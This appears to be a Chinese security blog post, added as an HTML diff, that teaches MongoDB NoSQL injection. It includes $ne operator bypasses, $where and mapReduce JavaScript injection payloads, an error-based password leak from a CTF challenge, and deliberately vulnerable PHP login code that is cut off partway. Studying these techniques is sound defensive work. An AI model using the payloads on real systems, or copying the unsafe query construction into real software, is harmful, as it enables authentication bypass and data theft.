@@ -1,0 +1,547 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>nosql - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/1.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="nosql">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-09-20 12:46" pubdate>
+        2021年9月20日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      33
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">nosql</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Mogodb数据库"><a href="#Mogodb数据库" class="headerlink" title="Mogodb数据库"></a>Mogodb数据库</h1><p>在 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/cdb?from=10680">MySQL</a> 中，我们所熟知的几个最常见的概念是数据库 (Database)、表 (Table)、字段 (Column)、记录 (Record)、索引 (Index)，这些术语映射到 MongoDB 中大概等价于数据库 (Database)、集合 (Collection)、域 (Field)、文档 (Document)、索引 (Index)。一些基本操作可以看文档</p>
+<h1 id="经典注入方式"><a href="#经典注入方式" class="headerlink" title="经典注入方式"></a>经典注入方式</h1><h3 id="永真注入"><a href="#永真注入" class="headerlink" title="永真注入"></a>永真注入</h3><p>利用的原理类似于万能密码，使查询的判定结果永远为true</p>
+<p>例如当为如下查询语句时，当get传参为<code>?username[$ne]=1&amp;password[$ne]=1</code>则传入mogodb后成为了一个条件查询。即为查询username和password不等于1的数据，当然这只是一个简单的例子，这里也可以用其他的条件操作符。</p>
+<p><img src="https://img-blog.csdnimg.cn/36584b6cdcc5432a80bfeac368c97e18.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment"># 查询语句</span><br><span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\Query(<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;uname&#x27;</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>],<br>    <span class="hljs-string">&#x27;pwd&#x27;</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>));<br><span class="hljs-comment"># 执行语句</span><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$manager</span>-&gt;executeQuery(<span class="hljs-string">&#x27;test.users&#x27;</span>, <span class="hljs-variable">$query</span>)-&gt;toArray();<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>我们都知道在 SQL 时代拼接字符串容易造成 SQL 注入，NoSQL 也有类似问题，但是现在无论是 PHP 的 MongoDB driver 还是 node.js 的 mongoose 都必须要求查询条件必须是一个数组或者 query 对象了，因此简单看一下就好。</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">string</span> query =<span class="hljs-string">&quot;&#123; username: &#x27;&quot;</span> + <span class="hljs-variable">$username</span> + <span class="hljs-string">&quot;&#x27;, password: &#x27;&quot;</span> + <span class="hljs-variable">$password</span> + <span class="hljs-string">&quot;&#x27; &#125;&quot;</span>  <span class="hljs-comment">#查询语句</span><br></code></pre></div></td></tr></table></figure>
+
+<p>这里构造payload</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">username=admin<span class="hljs-string">&#x27;,&#123;$or:[&#123;&#125;,&#123;&#x27;</span>a<span class="hljs-string">&#x27;:&#x27;</span>a&amp;password=<span class="hljs-string">&#x27;&#125;]</span><br></code></pre></div></td></tr></table></figure>
+
+<p>这样最终的查询语句就变为</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">&#123; username: <span class="hljs-string">&#x27;admin&#x27;</span>,&#123;<span class="hljs-variable">$or</span>:[&#123;&#125;,&#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>, password: <span class="hljs-string">&#x27;&#x27;</span>&#125;] &#125;<br>在后端中即为：&#123; username: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$or</span>: [ &#123;&#125;, &#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>, password:<span class="hljs-string">&#x27;&#x27;</span>&#125;]&#125;<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="JavaScript-注入"><a href="#JavaScript-注入" class="headerlink" title="JavaScript 注入"></a><strong>JavaScript 注入</strong></h3><p>我们知道 MongDB Server 是支持 JavaScript 语言的，这样给开发人员带来了很多非常方便的使用方法，但也是因为它本身的灵活性，造成了 JavaScript 注入。这里有个例子是一个祥云杯的一个题，那个是用node.js实现的一个mongodb查询，当时是可以使用nodejs报错机制来将密码带出来。</p>
+<p>查询语句如下</p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">let</span> docs = <span class="hljs-keyword">await</span> User.$where(<span class="hljs-string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="hljs-subst">$&#123;token.toString()&#125;</span>&quot;`</span>).exec()<br></code></pre></div></td></tr></table></figure>
+
+<p>这里可以使用如下payload进行报错。</p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<span class="hljs-string">&quot;||(()=&gt;&#123;throw Error(this.password)&#125;)()==&quot;</span>admin<br></code></pre></div></td></tr></table></figure>
+
+<h5 id="where-操作符"><a href="#where-操作符" class="headerlink" title="$where 操作符"></a><strong>$where 操作符</strong></h5><p>在 MongoDB 中 $where 操作符是可以执行 JavaScript 语句的，在 MongoDB 2.4 之前，通过 $where 操作符使用<code>map-reduce</code>、<code>group</code>命令可以访问到 mongo shell 中的全局函数和属性。</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$function</span> = <span class="hljs-string">&quot;function() &#123;if(this.uname == &#x27;<span class="hljs-subst">$uname</span>&#x27; &amp;&amp; this.pwd == &#x27;<span class="hljs-subst">$pwd</span>&#x27;) return &#123;&#x27;username&#x27;: this.uname, &#x27;password&#x27;: this.pwd&#125;&#125;&quot;</span>;<br><span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\Query(<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;$where&#x27;</span> =&gt; <span class="hljs-variable">$function</span><br>));<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$manager</span>-&gt;executeQuery(<span class="hljs-string">&#x27;test.users&#x27;</span>, <span class="hljs-variable">$query</span>)-&gt;toArray();<br></code></pre></div></td></tr></table></figure>
+
+<p>MongoDB&lt;2.4之前可以访问到全局属性</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">?username=<span class="hljs-string">&#x27;||1) return &#123;&#x27;</span>username<span class="hljs-string">&#x27;: tojson(db.getCollectionNames()), &#x27;</span>password<span class="hljs-string">&#x27;: &#x27;</span>hacked<span class="hljs-string">&#x27;&#125;&#125;//&amp;password=1</span><br></code></pre></div></td></tr></table></figure>
+
+<p>这里也存在nosql的万能密码</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">?username=<span class="hljs-string">&#x27;||&#x27;</span><span class="hljs-number">1</span>&amp;pwd=<span class="hljs-number">1</span><br>?username=<span class="hljs-number">1</span>&amp;pwd=admin<span class="hljs-string">&#x27;||&#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="mapReduce"><a href="#mapReduce" class="headerlink" title="mapReduce"></a><strong>mapReduce</strong></h4><p>看一下官方文档给的例子</p>
+<p><img src="https://img-blog.csdnimg.cn/24aea38e18414b5dbc2452ae94c9fd76.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>Map 函数和 Reduce 函数可以使用 JavaScript 来实现，使得 MapReduce 的使用非常灵活和强大。但是同样也带来了隐患，假设有这样的一个业务场景，数据库中存储了一个<code>store</code>集合，有一系列商品的名称、价格和数量，我们想得到相同商品的价格或者数量的总和，代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">require_once __DIR__ . <span class="hljs-string">&quot;/vendor/autoload.php&quot;</span>;<br>$param = $_POST[<span class="hljs-string">&#x27;param&#x27;</span>];<br>$collection = (<span class="hljs-keyword">new</span> MongoDB\Client)-&gt;test-&gt;stores;<br>$map = <span class="hljs-string">&quot;function() &#123;</span><br><span class="hljs-string">        for (var i = 0; i &lt; this.items.length; i++) &#123;</span><br><span class="hljs-string">      emit(this.name, this.items[i].$param);    &#125;</span><br><span class="hljs-string">        &#125;&quot;</span>;<br>$reduce = <span class="hljs-string">&quot;function(name, sum) &#123; return Array.sum(sum); &#125;&quot;</span>;<br>$opt = <span class="hljs-string">&quot;&#123; out: &#x27;totals&#x27; &#125;&quot;</span>;<br>$results = $collection-&gt;mapReduce($map, $reduce, $out);<br><br>这里map中emit第一个参数为需要分组的字段名，第二个参数为需要进行统计的字段名<br>reduce函数参数<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reduce</span>(<span class="hljs-params">key, values</span>)</span>&#123; <span class="hljs-comment">// 统计字段处理 &#125;</span><br>key： 指分组字段（emit的param1）对应的值；<br>values：指需要统计的字段（emit的param2）值组成的数组。<br></code></pre></div></td></tr></table></figure>
+
+<p>该代码应该在<code>$param</code>给定的字段上求和，但是这同样给了攻击者可乘之机，如果<code>$param</code>是这样：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">a);&#125;&#125;,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">kv</span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; &#125;, &#123; <span class="hljs-attr">out</span>: ‘x’ &#125;);<br>db.injection.insert(&#123;<span class="hljs-attr">success</span>:<span class="hljs-number">1</span>&#125;); <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>db.stores.mapReduce(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123; &#123; emit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>
+
+<p>那么在 MongoDB 中就相当于执行了下面这条语句：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">db.stores.mapReduce(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.items.length; i++) &#123;<br>emit(<span class="hljs-built_in">this</span>.name, <span class="hljs-built_in">this</span>.items[i].a);<br>&#125;<br>&#125;,<br><span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">kv</span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; &#125;, &#123; <span class="hljs-attr">out</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;);<br>db.injection.insert(&#123;<span class="hljs-attr">success</span>:<span class="hljs-number">1</span>&#125;); <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>db.stores.mapReduce(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123; &#123; emit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>); &#125; &#125;,<br><span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">name, sum</span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">Array</span>.sum(sum); &#125;, &#123; <span class="hljs-attr">out</span>: <span class="hljs-string">&#x27;totals&#x27;</span> &#125;);<span class="hljs-string">&quot;</span><br></code></pre></div></td></tr></table></figure>
+
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>和sql盲注区别不大</p>
+<h1 id="操作实例"><a href="#操作实例" class="headerlink" title="操作实例"></a>操作实例</h1><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&quot;/vendor/autoload.php&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">auth</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>    <span class="hljs-variable">$collection</span> = (<span class="hljs-keyword">new</span> MongoDB\Client(<span class="hljs-string">&#x27;mongodb://localhost:27017/&#x27;</span>))-&gt;test-&gt;users;<br>    <span class="hljs-variable">$raw_query</span> = <span class="hljs-string">&#x27;&#123;&quot;username&quot;: &quot;&#x27;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&#x27;&quot;, &quot;password&quot;: &quot;&#x27;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span>;<br>    <span class="hljs-variable">$document</span> = <span class="hljs-variable">$collection</span>-&gt;findOne(json_decode(<span class="hljs-variable">$raw_query</span>));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$document</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$document</span>-&gt;password)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$user</span> = auth(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$user</span> = auth(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span>) &#123;<br>        setcookie(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br>        setcookie(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span> == <span class="hljs-literal">true</span>): <span class="hljs-meta">?&gt;</span><br>    Welcome!<br>    &lt;div&gt;<br>        Group most common news by<br>        &lt;a href=<span class="hljs-string">&quot;?filter=<span class="hljs-subst">$category</span>&quot;</span>&gt;category&lt;/a&gt; |<br>        &lt;a href=<span class="hljs-string">&quot;?filter=<span class="hljs-subst">$public</span>&quot;</span>&gt;publicity&lt;/a&gt;&lt;br&gt;<br>    &lt;/div&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$filter</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filter&#x27;</span>];<br>        <span class="hljs-variable">$collection</span> = (<span class="hljs-keyword">new</span> MongoDB\Client(<span class="hljs-string">&#x27;mongodb://localhost:27017/&#x27;</span>))-&gt;test-&gt;news;<br>        <span class="hljs-variable">$pipeline</span> = [<br>            [<span class="hljs-string">&#x27;$group&#x27;</span> =&gt; [<span class="hljs-string">&#x27;_id&#x27;</span> =&gt; <span class="hljs-string">&#x27;$category&#x27;</span>, <span class="hljs-string">&#x27;count&#x27;</span> =&gt; [<span class="hljs-string">&#x27;$sum&#x27;</span> =&gt; <span class="hljs-number">1</span>]]],<br>            [<span class="hljs-string">&#x27;$sort&#x27;</span> =&gt; [<span class="hljs-string">&#x27;count&#x27;</span> =&gt; -<span class="hljs-number">1</span>]],<br>            [<span class="hljs-string">&#x27;$limit&#x27;</span> =&gt; <span class="hljs-number">5</span>],<br>        ];<br>        <span class="hljs-variable">$filters</span> = [<br>            [<span class="hljs-string">&#x27;$project&#x27;</span> =&gt; [<span class="hljs-string">&#x27;category&#x27;</span> =&gt; <span class="hljs-variable">$filter</span>]]<br>        ];<br>        <span class="hljs-variable">$cursor</span> = <span class="hljs-variable">$collection</span>-&gt;aggregate(array_merge(<span class="hljs-variable">$filters</span>, <span class="hljs-variable">$pipeline</span>));<br>    <span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filter</span>)): <span class="hljs-meta">?&gt;</span><br>        <span class="hljs-meta">&lt;?php</span><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cursor</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$category</span>) &#123;<br>                    printf(<span class="hljs-string">&quot;%s has %d news&lt;br&gt;&quot;</span>, <span class="hljs-variable">$category</span>[<span class="hljs-string">&#x27;_id&#x27;</span>], <span class="hljs-variable">$category</span>[<span class="hljs-string">&#x27;count&#x27;</span>]);<br>            &#125;<br>        <span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">else</span>: <span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])): <span class="hljs-meta">?&gt;</span><br>        Invalid username <span class="hljs-keyword">or</span> password<br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br>    &lt;form action=<span class="hljs-string">&#x27;/&#x27;</span> method=<span class="hljs-string">&quot;POST&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>    &lt;/form&gt;<br>    &lt;h2&gt;News&lt;/h2&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$collection</span> = (<span class="hljs-keyword">new</span> MongoDB\Client(<span class="hljs-string">&#x27;mongodb://localhost:27017/&#x27;</span>))-&gt;test-&gt;news;<br>        <span class="hljs-variable">$cursor</span> = <span class="hljs-variable">$collection</span>-&gt;find([<span class="hljs-string">&#x27;public&#x27;</span> =&gt; <span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cursor</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$news</span>) &#123;<br>            printf(<span 